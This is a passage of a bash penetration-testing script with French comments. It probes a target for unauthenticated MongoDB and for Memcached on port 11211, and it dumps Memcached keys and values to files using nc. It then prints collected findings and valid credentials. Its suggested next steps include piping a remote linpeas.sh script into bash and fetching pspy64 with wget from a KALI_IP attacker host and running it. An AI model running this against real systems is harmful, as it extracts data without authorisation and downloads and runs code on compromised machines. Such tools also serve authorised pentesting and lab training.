    if [[ -n "$MONGO_DBS" ]] && ! echo "$MONGO_DBS" | grep -q "unauthorized\|not authorized"; then
        success "MONGODB ACCESSIBLE SANS AUTH !"
        echo "$MONGO_DBS" | tee "$OUTDIR/mongo_databases.txt"
        finding "MONGODB_NOAUTH"
        echo "MONGODB_NOAUTH" >> "$OUTDIR/findings.txt"
    fi
fi

# ─── 16. MEMCACHED (11211) ─────────────────────────────────────
section "16. MEMCACHED (11211)"

nc -w 2 "$TARGET" 11211 </dev/null 2>/dev/null || { info "Port 11211 fermé — Memcached ignoré"; }

info "Memcached — stats dump"
MEMCACHE_STATS=$(printf "stats\r\nstats items\r\nquit\r\n" | \
    timeout 5 nc -w 3 "$TARGET" 11211 2>/dev/null)

if [[ -n "$MEMCACHE_STATS" ]] && echo "$MEMCACHE_STATS" | grep -q "STAT"; then
    success "MEMCACHED ACCESSIBLE !"
    echo "$MEMCACHE_STATS" | tee "$OUTDIR/memcached_stats.txt"
    finding "MEMCACHED_OPEN"
    echo "MEMCACHED_OPEN" >> "$OUTDIR/findings.txt"

    # Extraire et dump les items
    SLABS=$(echo "$MEMCACHE_STATS" | grep -oP "STAT items:\K\d+" | sort -u | head -5)
    for SLAB in $SLABS; do
        ITEMS=$(printf "stats cachedump $SLAB 100\r\nquit\r\n" | \
            timeout 5 nc -w 3 "$TARGET" 11211 2>/dev/null)
        KEYS=$(echo "$ITEMS" | grep -oP 'ITEM \K\S+' | head -10)
        for KEY in $KEYS; do
            VALUE=$(printf "get $KEY\r\nquit\r\n" | \
                timeout 3 nc -w 2 "$TARGET" 11211 2>/dev/null)
            echo "$KEY => $VALUE" >> "$OUTDIR/memcached_data.txt"
        done
    done
    [[ -s "$OUTDIR/memcached_data.txt" ]] && {
        success "Données Memcached dumpées !"
        head -20 "$OUTDIR/memcached_data.txt"
    }
fi

# ─── SUMMARY ───────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ LINUX ━━━${NC}"
[[ -s "$OUTDIR/nmap_fingerprint.txt" ]] && {
    info "OS Info :"
    grep -E "OS details|Linux|Ubuntu|Debian|CentOS|RHEL" "$OUTDIR/nmap_fingerprint_raw.txt" 2>/dev/null | head -3
}

echo ""
[[ -s "$OUTDIR/findings.txt" ]] && {
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
    echo ""
}

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    success "CREDENTIALS VALIDES :"
    cat "$OUTDIR/valid_creds.txt"
    echo ""
}

info "Prochaines étapes suggérées :"
echo "  • SSH accès  : ssh ${USER:-root}@$TARGET"
echo "  • Web fuzzing approfondi : ffuf / gobuster avec wordlists plus grandes"
echo "  • Post-shell : LinPEAS → curl -L https://...linpeas.sh | bash"
echo "  • Cron watch : wget http://KALI_IP:8888/pspy64 -O /tmp/pspy64 && chmod +x /tmp/pspy64 && /tmp/pspy64"
